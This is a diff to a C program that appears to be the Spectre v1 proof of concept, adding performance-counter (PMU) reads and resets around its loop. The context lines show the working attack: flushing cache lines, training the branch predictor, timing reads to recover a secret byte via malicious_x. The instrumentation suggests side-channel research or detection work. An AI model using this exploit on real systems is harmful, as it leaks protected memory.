@@ -23,7 +23,7 @@ OR
 why not just use perf system calls to measure values?
 ********************************************************************/
 #include "pmu.h"
-#define LOG_FILE "log/front_end.csv"
+#define LOG_FILE "log/log.csv"
 
 
 /********************************************************************
@@ -68,12 +68,19 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	for (tries = 999; tries > 0; tries--)
 	{
 		// PMU
-		read_pmu();
+		//read_pmu();
+		//reset_pmu();
 		
 		
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
 			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+		
+		
+		// PMU
+		//read_pmu();
+		reset_pmu();
+
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
@@ -97,6 +104,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 		// PMU
 		read_pmu();
+		//reset_pmu();
 
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -127,6 +135,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		}
 		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
 			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+		
+		
+		// PMU
+		//read_pmu();
 	}
 	results[0] ^= junk; /* use junk so code above won't get optimized out*/
 	value[0] = (uint8_t)j;
@@ -143,8 +155,9 @@ int main(int argc, const char* * argv)
 
 	// this will tell me how many commands each read_pmu() call takes
 	// PMU
-	read_pmu();
-	read_pmu();
+	//read_pmu();
+	//read_pmu();
+
 
 	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
